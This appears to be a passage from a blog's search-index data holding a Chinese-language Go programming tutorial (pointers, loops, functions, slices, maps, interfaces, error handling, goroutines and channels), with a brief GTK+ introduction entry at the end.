\u0026amp;a; 将给出变量的实际地址。   * 指针变量。 *a; 是一个指针变量    实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var a int = 4 var b int32 var c float32 var ptr *int /* 运算符实例 */ fmt.Printf(\u0026#34;第 1 行 - a 变量类型为 = %T\\n\u0026#34;, a ); fmt.Printf(\u0026#34;第 2 行 - b 变量类型为 = %T\\n\u0026#34;, b ); fmt.Printf(\u0026#34;第 3 行 - c 变量类型为 = %T\\n\u0026#34;, c ); /* \u0026amp; 和 * 运算符实例 */ ptr = \u0026amp;a /* \u0026#39;ptr\u0026#39; 包含了 \u0026#39;a\u0026#39; 变量的地址 */ fmt.Printf(\u0026#34;a 的值为 %d\\n\u0026#34;, a); fmt.Printf(\u0026#34;*ptr 为 %d\\n\u0026#34;, *ptr); } 执行结果：\n第 1 行 - a 变量类型为 = int\r第 2 行 - b 变量类型为 = int32\r第 3 行 - c 变量类型为 = float32\ra 的值为 4\r*ptr 为 4\r运算符优先级    优先级 运算符     5 * / % \u0026laquo; \u0026raquo; \u0026amp; \u0026amp;^   4 + - | ^   3 == != \u0026lt; \u0026lt;= \u0026gt; \u0026gt;=   2 \u0026amp;\u0026amp;   1 ||    我们可以通过使用括号来临时提升某个表达式的整体运算优先级。\n条件判断语句    语句 描述     if 语句 if 语句 由一个布尔表达式后紧跟一个或多个语句组成。   if\u0026hellip;else 语句 if 语句 后可以使用可选的 else 语句, else 语句中的表达式在布尔表达式为 false 时执行。   if 嵌套语句 你可以在 if 或 else if 语句中嵌入一个或多个 if 或 else if 语句。   switch 语句 switch 语句用于基于不同条件执行不同动作。   select 语句 select 语句类似于 switch 语句，但是select会随机执行一个可运行的case。如果没有case可运行，它将阻塞，直到有case可运行。     注：Go 没有三目运算符，不支持?:形式的条件判断。\n 循环语句 Go 语言提供了以下几种类型循环处理语句：\n   循环类型 描述     for 循环 重复执行语句块   循环嵌套 在 for 循环中嵌套一个或多个 for 循环    循环控制语句 循环控制语句可以控制循环体内语句的执行过程。\nGO 语言支持以下几种循环控制语句：\n   控制语句 描述     break 语句 经常用于中断当前 for 循环或跳出 switch 语句   continue 语句 跳过当前循环的剩余语句，然后继续进行下一轮循环。   goto 语句 将控制转移到被标记的语句。    无限循环 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { for true { fmt.Printf(\u0026#34;这是无限循环。\\n\u0026#34;); } } 函数 函数定义 格式如下：\nfunc function_name( [parameter list] ) [return_types] { 函数体 } 函数定义解析：\n func：函数由 func 开始声明 function_name：函数名称，函数名和参数列表一起构成了函数签名。 parameter list：参数列表，参数就像一个占位符，当函数被调用时，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的，也就是说函数也可以不包含参数。 return_types：返回类型，函数返回一列值。return_types 是该列值的数据类型。有些功能不需要返回值，这种情况下 return_types 不是必须的。 函数体：函数定义的代码集合。  实例：\n// 返回两个数的较大者 func main(num1, num2 int) int { // 声明局部变量 \tvar result int if (num1 \u0026gt; num2) { result = num1 } else { result = num2 } return result } 函数调用 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { // 定义局部变量  var a int = 1 var b int = 2 var ret int // 调用函数返回最大值  ret = max(a, b) fmt.Printf(\u0026#34;Maximum: %d\\n\u0026#34;, ret) } // max()函数 func max(num1, num2 int) int { // 定义局部变量  var res int if (num1 \u0026gt; num2) { res = num1 } else { res = num2 } return res } 函数返回多个值 Go 函数可以返回多个值。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { a, b := swap(\u0026#34;dc\u0026#34;, \u0026#34;oops\u0026#34;) fmt.Println(a, b) } func swap(x, y string) (string, string) { return y, x } 执行结果：\noops dc\r函数参数 函数如果使用参数，该变量可称为函数的形参。\n形参就像定义在函数体内的局部变量。\n调用函数，可以通过两种方式来传递参数：\n   传递类型 描述     值传递 值传递是指在调用函数时将实际参数复制一份传递到函数中，这样在函数中如果对参数进行修改，将不会影响到实际参数。   引用传递 引用传递是指在调用函数时将实际参数的地址传递到函数中，那么在函数中对参数所进行的修改，将影响到实际参数。    默认情况下，Go 语言使用的是值传递，即在调用过程中不会影响到实际参数。\n函数用法    函数用法 描述     函数作为另外一个函数的实参 函数定义后可作为另外一个函数的实参数传入   闭包 闭包是匿名函数，可在动态编程中使用   方法 方法就是一个包含了接受者的函数    变量作用域 作用域为已声明标识符所表示的常量、类型、变量、函数或包在源代码中的作用范围。\nGo 语言中变量可以在三个地方声明：\n 函数内定义的变量称为局部变量 函数外定义的变量称为全局变量 函数定义中的变量称为形式参数  局部变量 在函数体内声明的变量称为局部变量，其作用域只在函数体内，参数和返回值也是局部变量。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { // 声明局部变量  var a, b, c int // 初始化参数  a = 1 b = 2 c = a + b fmt.Printf(\u0026#34;Res: a=%d, b=%d, c=%d\\n\u0026#34;, a, b, c) } 执行结果：\nRes: a=1, b=2, c=3\r全局变量 在函数体外声明的变量称为全局变量，其作用域可以在整个包甚至外部包(被导出后)使用。\n全局变量可在任何函数中使用。\n实例1：\npackage main import \u0026#34;fmt\u0026#34; // 声明全局变量 var g int func main() { // 声明局部变量  var a, b int // 初始化参数  a = 1 b = 2 g = a + b fmt.Printf(\u0026#34;Res: a=%d, b=%d, g=%d\\n\u0026#34;, a, b, g) } 执行结果：\nRes: a=1, b=2, g=3\rGo 语言中全局变量和局部变量名称可以相同，但位于函数内的局部变量会被优先考虑。\n实例2：\npackage main import \u0026#34;fmt\u0026#34; // 声明全局变量 var g int = 10 func main() { // 声明局部变量  var a, b, g int // 初始化参数  a = 1 b = 2 g = a + b fmt.Printf(\u0026#34;Res: a=%d, b=%d, g=%d\\n\u0026#34;, a, b, g) } 执行结果：\nRes: a=1, b=2, g=3\r我们可以看出，即使在函数外部给全局变量g赋值为10，最后输出的还是函数体内局部变量g的值。\n形式参数 形式参数会作为函数的局部变量来使用。\n实例：\npackage main import \u0026#34;fmt\u0026#34; // 声明全局变量 var a int = 10 func main() { // main()函数中声明局部变量  var a int = 1 var b int = 2 var c int = 0 fmt.Printf(\u0026#34;main()函数中 a=%d\\n\u0026#34;, a) c = sum(a, b) fmt.Printf(\u0026#34;main()函数中 c=%d\\n\u0026#34;, c) } // sum()函数定义 func sum(a, b int) int { fmt.Printf(\u0026#34;sum()函数中 a=%d\\n\u0026#34;, a) fmt.Printf(\u0026#34;sum()函数中 b=%d\\n\u0026#34;, b) return a + b } 执行结果：\nmain()函数中 a=1\rsum()函数中 a=1\rsum()函数中 b=2\rmain()函数中 c=3\r初始化局部和全局变量 不同类型的局部和全局变量默认值为：\n   数据类型 初始化默认值     int 0   float32 0   pointer nil    数组 Go 中提供了数组类型的数据结构。\n数组是具有相同唯一类型的一组已编号且长度固定的数据项序列，这种类型可以是任意的原始类型例如整型、字符串或者自定义类型。\n相对于去声明 number0, number1, \u0026hellip;, number99 的变量，使用数组形式 numbers[0], numbers[1] \u0026hellip;, numbers[99] 更加方便且易于扩展。\n数组元素可以通过索引（位置）来读取（或者修改），索引从 0 开始，第一个元素索引为 0，第二个索引为 1，以此类推。\n声明数组 语法格式如下：\nvar variable_name [SIZE] variable_type // 数组名 数组长度 数组类型 如我们定义一个类型为int，长度为10的数组balance：\nvar balance [10] int 初始化数组 var balance = [5]float32{1,2,3,4,5} 还可以通过字面量在声明数组的同时快速初始化：\nvar balance := [5]float32{1,2,3,4,5} 当数组长度不确定时，我们可以使用...代替数组长度，编译器会根据数组元素个数自动推断长度：\nvar balance := [...]float32{1,2,3,4,5} 当设置了数组长度时，我们可以通过指定下标来初始化元素：\n// 将索引为1和3的元素初始化 balance := [5]balance{1:1.0,3:3.0} {}中的元素个数不能大于[]中的数字。\n访问数组元素 实例1：\npackage main import \u0026#34;fmt\u0026#34; func main() { var arr [10] int\t// 长度为10的数组 \tvar i, j int // 给数组初始化元素 \tfor i = 0; i \u0026lt; 10; i++ { arr[i] = i + 1; } // 输出每个元素的值 \tfor j = 0; j \u0026lt; 10; j++ { fmt.Printf(\u0026#34;Ele[%d] = %d\\n\u0026#34;, j, arr[j]) } } 执行结果：\nEle[0] = 1\rEle[1] = 2\rEle[2] = 3\rEle[3] = 4\rEle[4] = 5\rEle[5] = 6\rEle[6] = 7\rEle[7] = 8\rEle[8] = 9\rEle[9] = 10\r实例2：\npackage main import \u0026#34;fmt\u0026#34; func main() { var i, j int arr := [...]float32{1,2,3,4,5} for i = 0; i \u0026lt; 5; i++ { fmt.Printf(\u0026#34;Ele[%d] = %f\\n\u0026#34;, i, arr[i]) } arr2 := [5]float32{1:2.0,3:7.0} for j = 0; j \u0026lt; 5; j++ { fmt.Printf(\u0026#34;Ele[%d] = %f\\n\u0026#34;, j, arr2[j]) } } 执行结果：\nEle[0] = 1.000000\rEle[1] = 2.000000\rEle[2] = 3.000000\rEle[3] = 4.000000\rEle[4] = 5.000000\rEle[0] = 0.000000\rEle[1] = 2.000000\rEle[2] = 0.000000\rEle[3] = 7.000000\rEle[4] = 0.000000\r更多内容 数组对 Go 语言来说非常重要，以下我们是关于数组更多的内容：\n   内容 描述     多维数组 Go 语言支持多维数组，最简单的多维数组是二维数组   向函数传递数组 你可以向函数传递数组参数    指针 指针变量通常缩写为ptr。\n指针使用 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var a int = 20 var ip *int ip = \u0026amp;a fmt.Printf(\u0026#34;a 变量地址为: %x\\n\u0026#34;, \u0026amp;a) fmt.Printf(\u0026#34;ip 变量存储地址为: %x\\n\u0026#34;, ip) fmt.Printf(\u0026#34;*ip 指向的值: %d\\n\u0026#34;, *ip) } 执行结果：\na 变量地址为: c000128058\rip 变量存储地址为: c000128058\r*ip 指向的值: 20\r空指针 当指针没有被分配到任何变量时，值为nil。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var ptr *int fmt.Printf(\u0026#34;%x\\n\u0026#34;, ptr) } 执行结果：\n0\r空指针判断：\nif (ptr != nil) if (ptr == nil) 更多内容    内容 描述     Go 指针数组 你可以定义一个指针数组来存储地址   Go 指向指针的指针 Go 支持指向指针的指针   Go 向函数传递指针参数 通过引用或地址传参，在函数调用时可以改变其值    结构体 数组可以存储同一类型的数据，结构体中可以为不同项定义不同数据类型。\n结构体是由一系列具有相同类型或不同类型数据构成的数据集合。\n结构体表示一项纪录，比如一个学生有以下属性：\n 姓名 学号 学院 专业  定义结构体 使用type和struct语句。\ntype语句设定了结构体名称。\nstruct语句定义了一个新的数据类型，结构体中有一个或多个成员。\n结构体格式如下：\ntype struct_variable_type struct { member definition member definition ... } 定义了结构体类型，就能用于变量声明：\nvariable_name := structure_variable_type {value1, value2...} variable_name := structure_variable_type {key1:value1, key2:value2...} 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(Books{\u0026#34;Go lang\u0026#34;, \u0026#34;DC\u0026#34;, \u0026#34;Go lang learn\u0026#34;, \u0026#34;oopsdc.tk\u0026#34;}) fmt.Println(Books{title:\u0026#34;Go lang\u0026#34;, author:\u0026#34;DC\u0026#34;, subject:\u0026#34;Go lang learn\u0026#34;, website:\u0026#34;oopsdc.tk\u0026#34;}) fmt.Println(Books{title:\u0026#34;Go lang\u0026#34;, author:\u0026#34;DC\u0026#34;}) } type Books struct { title string author string subject string website string } 执行结果：\n{Go lang DC Go lang learn oopsdc.tk}\r{Go lang DC Go lang learn oopsdc.tk}\r{Go lang DC }\r访问结构体成员 格式：\n结构体.成员名\r实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var Book1 Books var Book2 Books Book1.title = \u0026#34;C语言\u0026#34; Book1.author = \u0026#34;DC\u0026#34; Book1.subject = \u0026#34;编程\u0026#34; Book1.id = 00001 Book2.title = \u0026#34;Python语言\u0026#34; Book2.author = \u0026#34;DC\u0026#34; Book2.subject = \u0026#34;编程\u0026#34; Book2.id = 00002 fmt.Printf(\u0026#34;Book1 title: %s\\n\u0026#34;, Book1.title) fmt.Printf(\u0026#34;Book1 author: %s\\n\u0026#34;, Book1.author) fmt.Printf(\u0026#34;Book1 subject: %s\\n\u0026#34;, Book1.subject) fmt.Printf(\u0026#34;Book1 id: %d\\n\u0026#34;, Book1.id) fmt.Printf(\u0026#34;Book2 title: %s\\n\u0026#34;, Book2.title) fmt.Printf(\u0026#34;Book2 author: %s\\n\u0026#34;, Book2.author) fmt.Printf(\u0026#34;Book2 subject: %s\\n\u0026#34;, Book2.subject) fmt.Printf(\u0026#34;Book2 id: %d\\n\u0026#34;, Book2.id) } type Books struct { title string author string subject string id int } 执行结果：\nBook1 title: C语言\rBook1 author: DC\rBook1 subject: 编程\rBook1 id: 1\rBook2 title: Python语言\rBook2 author: DC\rBook2 subject: 编程\rBook2 id: 2\r结构体作为函数参数 我们可以像其它数据类型一样将结构体类型作为参数传递给函数。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var Book1 Books var Book2 Books Book1.title = \u0026#34;C语言\u0026#34; Book1.author = \u0026#34;DC\u0026#34; Book1.subject = \u0026#34;编程\u0026#34; Book1.date = \u0026#34;2021-03-19\u0026#34; Book2.title = \u0026#34;Python\u0026#34; Book2.author = \u0026#34;DC\u0026#34; Book2.subject = \u0026#34;编程\u0026#34; Book2.date = \u0026#34;2021-03-19\u0026#34; printBook(Book1) printBook(Book2) } type Books struct { title string author string subject string date string } func printBook(book Books) { fmt.Printf(\u0026#34;Title: %s\\n\u0026#34;, book.title) fmt.Printf(\u0026#34;Author: %s\\n\u0026#34;, book.author) fmt.Printf(\u0026#34;Subject: %s\\n\u0026#34;, book.subject) fmt.Printf(\u0026#34;Date: %s\\n\u0026#34;, book.date) } 执行结果：\nTitle: C语言\rAuthor: DC\rSubject: 编程\rDate: 2021-03-19\rTitle: Python\rAuthor: DC\rSubject: 编程\rDate: 2021-03-19\r结构体指针 定义结构体指针其实类似于其它指针变量：\nvar strcut_pointer *ptr 以上定义的指针变量可以存储结构体变量地址。我们可以通过\u0026amp;符号查看结构体变量地址：\nstruct_pointer = \u0026amp;ptr 使用结构体指针访问结构体成员，使用.：\nstruct_pointer.title 我们用指针重写一下之前结构体的实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var Book1 Books var Book2 Books Book1.title = \u0026#34;C语言\u0026#34; Book1.author = \u0026#34;DC\u0026#34; Book1.subject = \u0026#34;编程\u0026#34; Book1.date = \u0026#34;2021-03-19\u0026#34; Book2.title = \u0026#34;Python\u0026#34; Book2.author = \u0026#34;DC\u0026#34; Book2.subject = \u0026#34;编程\u0026#34; Book2.date = \u0026#34;2021-03-19\u0026#34; printBook(\u0026amp;Book1) printBook(\u0026amp;Book2) } type Books struct { title string author string subject string date string } func printBook(book *Books) { fmt.Printf(\u0026#34;Title: %s\\n\u0026#34;, book.title) fmt.Printf(\u0026#34;Author: %s\\n\u0026#34;, book.author) fmt.Printf(\u0026#34;Subject: %s\\n\u0026#34;, book.subject) fmt.Printf(\u0026#34;Date: %s\\n\u0026#34;, book.date) } 切片 切片是对数组的抽象。\nGo 中数组长度不可变，不适用部分特定场景，Go 提供了一种灵活且功能强悍的内置类型——切片(\u0026ldquo;动态数组\u0026rdquo;)。与数组相比，切片长度不固定，可以追加元素，在追加时可能使切片容量增大。\n定义切片 声明一个未指定长度的数组来定义切片：\nvar identifier []type 切片不需要指定长度。\n我们还可以使用make()函数创建切片：\nvar slice1 []type = make([]type, len) slice1 := make([]type, len) 也可以指定容量，capacity为可选参数：\nmake([]T, length, capacity) 此处的len是数组长度也是切片初始长度。\n切片初始化 直接初始化切片，[]表示切片类型，{1,2,3}初始化值依次为1,2,3，cap=len=3：\ns := [] int {1,2,3} 初始化切片s，是数组arr的引用：\ns := arr[:] 将arr中下标为startIndex到endIndex-1下的元素创建为一个新的切片：\ns := arr[startIndex:endIndex] 默认endIndex时将表示一直到arr的最后一个元素：\ns := arr[startIndex:]\r默认startIndex时表示从arr的第一个元素开始：\ns := arr[:endIndex] 通过切片s初始化切片s1：\ns1 := s[startIndex:endIndex] 通过内置函数make()初始化切片s，[]int标识其元素类型为int的切片：\ns := make([]int, len, cap) len()和cap()函数 切片可索引，且可由len()方法获取长度。\n切片提供了计算容量的方法，cap()可以测量切片长度上限。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var nums = make([]int, 3, 5) printSlice(nums) } func printSlice(x []int) { fmt.Printf(\u0026#34;len=%d cap=%d slice=%v\u0026#34;, len(x), cap(x), x) } 执行结果：\nlen=3 cap=5 slice=[0 0 0]\r空切片 切片在未初始化之前默认为nil，长度为0。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var nums[] int printSlice(nums) if (nums == nil) { fmt.Println(\u0026#34;切片为空!\u0026#34;) } } func printSlice(x []int) { fmt.Printf(\u0026#34;len=%d cap=%d slice=%v\\n\u0026#34;, len(x), cap(x), x) } 执行结果：\nlen=0 cap=0 slice=[]\r切片为空!\r切片截取 可通过设置上下限设置截取切片。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { nums := []int{1,2,3,4,5,6,7,8,9} printSlice(nums) fmt.Println(\u0026#34;nums=\u0026#34;,nums) fmt.Println(\u0026#34;nums[1:4]=\u0026#34;,nums[1:4]) fmt.Println(\u0026#34;nums[:3]=\u0026#34;,nums[:3]) fmt.Println(\u0026#34;nums[4:]=\u0026#34;,nums[4:]) nums1 := make([]int, 0, 5) printSlice(nums1) num2 := nums[:2] printSlice(num2) num3 := nums[2:5] printSlice(num3) } func printSlice(x []int) { fmt.Printf(\u0026#34;len=%d cap=%d slice=%v\\n\u0026#34;, len(x), cap(x), x) } 执行结果：\nlen=9 cap=9 slice=[1 2 3 4 5 6 7 8 9]\rnums= [1 2 3 4 5 6 7 8 9]\rnums[1:4]= [2 3 4]\rnums[:3]= [1 2 3]\rnums[4:]= [5 6 7 8 9]\rlen=0 cap=5 slice=[]\rlen=2 cap=9 slice=[1 2]\rlen=3 cap=7 slice=[3 4 5]\r前闭后开。\nappend()与copy()函数 若想增加切片容量，我们要创建一个新的更大的切片并把原切片内容拷贝过来，接下来我们通过copy与append方法。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var nums []int printSlice(nums) nums = append(nums, 0) printSlice(nums) nums = append(nums, 1) printSlice(nums) nums = append(nums, 1, 2, 3) printSlice(nums) nums1 := make([]int, len(nums), (cap(nums))*2) copy(nums1, nums) printSlice(nums1) } func printSlice(x []int) { fmt.Printf(\u0026#34;len=%d cap=%d slice=%v\\n\u0026#34;, len(x), cap(x), x) } 执行结果：\nlen=0 cap=0 slice=[]\rlen=1 cap=1 slice=[0]\rlen=2 cap=2 slice=[0 1]\rlen=5 cap=6 slice=[0 1 1 2 3]\rlen=5 cap=12 slice=[0 1 1 2 3]\rRange Go 语言中range关键字由于for循环中迭代数组(array)、切片(slice)、通道(channel)或集合(map)的元素，在数组和切片中它返回元素的索引及索引对应的值。即键值对。(key-value)\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { nums := []int{2, 3, 4} sum := 0 for _, num := range nums { sum += num } fmt.Println(\u0026#34;sum:\u0026#34;, sum) for i, num := range nums { if num == 3 { fmt.Println(\u0026#34;index:\u0026#34;, i) } } kvs := map[string]string{\u0026#34;a\u0026#34;:\u0026#34;apple\u0026#34;, \u0026#34;b\u0026#34;:\u0026#34;banana\u0026#34;} for k, v := range kvs { fmt.Printf(\u0026#34;%s -\u0026gt; %s\\n\u0026#34;, k, v) } for i, c := range \u0026#34;go\u0026#34; { fmt.Println(i, c) } } 执行结果：\nsum: 9\rindex: 1\ra -\u0026gt; apple\rb -\u0026gt; banana\r0 103\r1 111\rMap Map是一种无需的键值对集合，它最重要的一点是通过key来快速检索数据，key类似于索引，指向数据的值。\n我们可以像迭代数组和切片那样迭代Map，但Map时无序的，我们无法决定它的返回顺序，因为Map使用hash表实现。\n定义Map 1.使用内建函数make\n2.使用map关键字\nvar map_variable map[key_data_type]value_data_type map_variable := make(map[key_data_type]value_type) 若不初始化map，那么会创建一个nil map，nil map不能用来存放键值对。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var testMap map[string]string testMap = make(map[string]string) testMap [\u0026#34;人文\u0026#34;] = \u0026#34;法学\u0026#34; testMap [\u0026#34;数计\u0026#34;] = \u0026#34;计算机\u0026#34; testMap [\u0026#34;外国语\u0026#34;] = \u0026#34;翻译\u0026#34; testMap [\u0026#34;智能制造\u0026#34;] = \u0026#34;嵌入式\u0026#34; for aca := range testMap { fmt.Println(aca, \u0026#34;招牌是\u0026#34;, testMap [aca]) } maj, ok := testMap [\u0026#34;土木\u0026#34;] if (ok) { fmt.Println(\u0026#34;土木的招牌是:\u0026#34;, maj) } else { fmt.Println(\u0026#34;值不存在\u0026#34;) } } 执行结果：\n智能制造 招牌是 嵌入式\r人文 招牌是 法学\r数计 招牌是 计算机\r外国语 招牌是 翻译\r值不存在\rdelete()函数 delete()函数用于删除集合元素，参数为map和其对应的key。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { testMap := map[string]string{\u0026#34;一\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;二\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;三\u0026#34;: \u0026#34;3\u0026#34;} fmt.Println(\u0026#34;原始数据\u0026#34;) for i := range testMap { fmt.Println(i, \u0026#34;值为\u0026#34;, testMap [i]) } delete(testMap, \u0026#34;一\u0026#34;) fmt.Println(\u0026#34;一被删除\u0026#34;) fmt.Println(\u0026#34;删除后数据\u0026#34;) for i := range testMap { fmt.Println(i, \u0026#34;值为\u0026#34;, testMap [i]) } } 执行结果：\n原始数据\r一 值为 1\r二 值为 2\r三 值为 3\r一被删除\r删除后数据\r三 值为 3\r二 值为 2\r递归函数 Go 支持递归，但在使用时需要设置退出条件，否则将陷入无限循环。\n阶乘 import \u0026#34;fmt\u0026#34; func main() { var i int = 15 fmt.Printf(\u0026#34;%d的阶乘为:%d\\n\u0026#34;, i, Factorial(uint64(i))) } func Factorial(n uint64)(res uint64) { if (n \u0026gt; 0) { res = n * Factorial(n-1) return res } return 1 } 执行结果：\n15的阶乘为:1307674368000\r斐波那契数列 package main import \u0026#34;fmt\u0026#34; func main() { var i int for i = 0; i \u0026lt; 10; i++ { fmt.Printf(\u0026#34;%d\\t\u0026#34;, fibonacci(i)) } } func fibonacci(n int) int { if n \u0026lt; 2 { return n } return fibonacci(n-2) + fibonacci(n-1) } 执行结果：\n0 1 1 2 3 5 8 13 21 34\r类型转换  注：Go 不支持隐式转换\n 基本格式：\ntype_name(expression) 类型 表达式 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var res float32 var sum = 17 var count = 5 res = float32(sum)/float32(count) fmt.Printf(\u0026#34;%f\\n\u0026#34;, res) } 执行结果：\n3.400000\r接口 Go 中提供了另一种数据类型，接口。它把所有具有共性的方法定义在一起，任何其它类型只要实现了这些方法就是实现了这个接口。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var phone Phone phone = new(NokiaPhone) phone.call() phone = new (IPhone) phone.call() } type Phone interface { call() } type NokiaPhone struct { } func (nokiaPhone NokiaPhone) call() { fmt.Println(\u0026#34;This is Nokiad\u0026#34;) } type IPhone struct { } func (iPhone IPhone) call() { fmt.Println(\u0026#34;iPhone plz!\u0026#34;) } 执行结果：\nThis is Nokiad\riPhone plz!\r错误处理 Go 通过内置的错误接口提供了非常简单的错误处理机制。\nerror类型是一个接口类型，定义如下：\ntype error interface { Error() string } 我们可以在编码中通过实现error接口类型来生成错误信息。\n函数通常在最后的返回值中返回错误信息，使用error New可返回一个错误信息：\nfunc Sqrt(f float64) (float64, error) { if f \u0026lt; 0 { return 0, errors.New(\u0026#34;math: square root of negative number\u0026#34;) } } 我们在调用Sqrt的时候传递一个负数，然后得到non-nil的error对象，将此对象与nil比较，结果为true，所以fmt.Println(fmt包在处理error时会调用Error方法)被调用，输出错误，实例如下：\nres, err := Sqrt(-1) if err != nil { fmt.Println(err) } 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { if res, errorMsg := Divide(100, 10); errorMsg == \u0026#34;\u0026#34; { fmt.Println(\u0026#34;100/10 = \u0026#34;, res) } if _, errorMsg := Divide(100, 0); errorMsg != \u0026#34;\u0026#34; { fmt.Println(\u0026#34;errorMsg:\u0026#34;, errorMsg) } } type DivideError struct { dividee int divider int } func (de *DivideError) Error() string { strFormat := ` Cannot proceed, the divider is zero! dividee: %d divider: 0 ` return fmt.Sprintf(strFormat, de.dividee) } func Divide(varDividee int, varDivider int) (res int, errorMsg string) { if varDivider == 0 { dData := DivideError { dividee: varDividee, divider: varDivider, } errorMsg = dData.Error() return } else { return varDividee / varDivider, \u0026#34;\u0026#34; } } 执行结果：\n100/10 = 10\rerrorMsg:\rCannot proceed, the divider is zero!\rdividee: 100\rdivider: 0\r并发 Go 支持并发，我们只需通过go关键字开启goroutine即可。\ngoroutine是轻量级线程，调度是由Golang 运行时进行管理的。\ngoroutine语法格式：\ngo 函数名(参数列表) 如：\ngo f(x, y, z) 开启一个新routine：\nf(x, y, z) Go 允许使用go 语句开启一个新的运行期线程，即goroutine。以一个不同的、新创建的goroutine来执行一个函数。同一个程序中所有goroutine共享一个地址空间。\n实例：\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { go say(\u0026#34;world\u0026#34;) say(\u0026#34;hello\u0026#34;) } func say(s string) { for i := 0; i \u0026lt; 5; i++ { time.Sleep(100 * time.Millisecond) fmt.Println(s) } } 执行结果：\nworld\rhello\rworld\rhello\rhello\rworld\rworld\rhello\rhello\r通道(channel) 通道是用来传递数据的一个数据结构，可用于两个goroutine之间通过传递一个指定类型的值来同步运行和通讯。操作符\u0026lt;-用于指定通道方向，发送或接收。若未指定方向，则为双向通道。\nch \u0026lt;- v\t// 把v发送到通道ch v := \u0026lt;-ch\t// 从ch接收数据并把值赋给v 通道在使用前必须先创建：\nch := make(chan int)  注：默认情况下通道不带缓冲区。发送端发送数据，同时必须有接收端接收相应数据。\n 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { s := []int{7, 2, 8, -9, 4, 1} c := make(chan int) go sum(s[:len(s)/2], c) go sum(s[len(s)/2:], c) x, y := \u0026lt;-c, \u0026lt;-c fmt.Println(x, y, x+y) } func sum(s []int, c chan int) { sum := 0 for _, v := range s { sum += v } c \u0026lt;- sum } 执行结果：\n-4 17 13\r通道缓冲区 通道可以设置缓冲区，通过make的第二个参数指定缓冲区大小。\nch := make(chan int, 100) 带缓冲区的通道允许发送端数据发送和接收端的数据获取处于异步状态，但由于缓冲区大小有限，所以必须由接收端来接收数据。\n 注：若通道不带缓冲，发送方会阻塞直到接收方从通道中接收了值。若通道带缓冲，发送方会阻塞直到发送的值被拷贝到缓冲区中，若缓冲区已满，则意味着需要等待直到接收方获取到一个值。接收方在有值可以接收之前会一直阻塞。\n 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { ch := make(chan int, 2) ch \u0026lt;- 1 ch \u0026lt;- 2 fmt.Println(\u0026lt;-ch) fmt.Println(\u0026lt;-ch) } 执行结果：\n1\r2\rGo遍历与关闭通道 Go 通过range关键字来实现遍历读取到的数据，类似于数组或切片。格式如下：\nv, ok := \u0026lt;- ch 若通道接收不到数据后ok为false，这时通道可以使用close()函数关闭。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { c := make(chan int, 10) go fibonacci(cap(c), c) for i := range c { fmt.Println(i) } } func fibonacci(n int, c chan int) { x, y := 0, 1 for i := 0; i \u0026lt; n; i++ { c \u0026lt;- x x, y = y, x+y } close(c) } 执行结果：\n0\r1\r1\r2\r3\r5\r8\r13\r21\r34\r","permalink":"https://oopsdc.github.io/post/go/","summary":"runoob教程：https://www.runoob.com/go/go-tutorial.html\n环境搭建 安装包官方下载地址：https://golang.org/dl/\n国内能打开的地址：https://golang.google.cn/dl/\nWindows安装go 安装包下载 这里我选择下载msi文件上面的go1.16.2.windows-amd64.zip压缩包，然后放在环境目录D:\\Env\\go1.16.2\\bin下解压。\n环境配置 将go目录下的/bin路径添加到Path环境变量中，点击新建。\n检测安装 打开cmd输入go。\nhello-world 在工作目录创建hello.go文件。\npackage main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;Hello, World!\u0026#34;) } 使用go run命令运行：\ngo run hello.go go build生成二进制文件运行：\n\u0026gt; go build .\\hello.go \u0026gt; ls Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 2021/3/15 10:50 2094592 hello.exe -a---- 2021/3/15 10:47 79 hello.go \u0026gt; .\\hello.exe Hello, World! Linux安装go 环境：Ubuntu 20.04.1(推荐使用WSL，但现在电脑上没配置，就在虚拟机上做了)\n官方安装文档：https://golang.google.cn/doc/install?download=go1.16.2.linux-amd64.tar.gz\n安装包下载 下载go1.16.2.linux-amd64.tar.gz压缩文件。\n解压 $ sudo tar -zxvf go1.16.2.linux-amd64.tar.gz 设置环境变量 $ export PATH=$PATH:/usr/local/go/bin 检测安装 $ go version 问题处理 本来想通过VMware Tools把压缩文件直接从主机拖到虚拟机的，但尝试本地解压VMware Tools失败，报错显示内存不足，尝试解压到其它目录。解决方法如下：","title":"Go"},{"content":"GTK+简介 GTK+(Gnome Toolkit+)最初是为GIMP(GNU Image Manipulation Program)写的，在开发早期GIMP版本时，Peter Mattis 和 Spencer Kimball创建了GTK(GIMP Toolkit)作为Motif收费工具包的替代。当GTK获得了面向对象特性和可扩展性后，才变为了GTK+。\nGTK+特点 稳定、跨平台、多语言绑定、接口丰富、与时俱进、算法丰富、移动嵌入式应用广泛.\n学习手册  GTK+2手册：https://developer.gnome.org/gtk2/ GTK+3手册：https://developer.gnome.org/gtk3/ 中文手册：https://www.bookstack.cn/read/GTK-3-Chinese-Reference-Manual/README.md  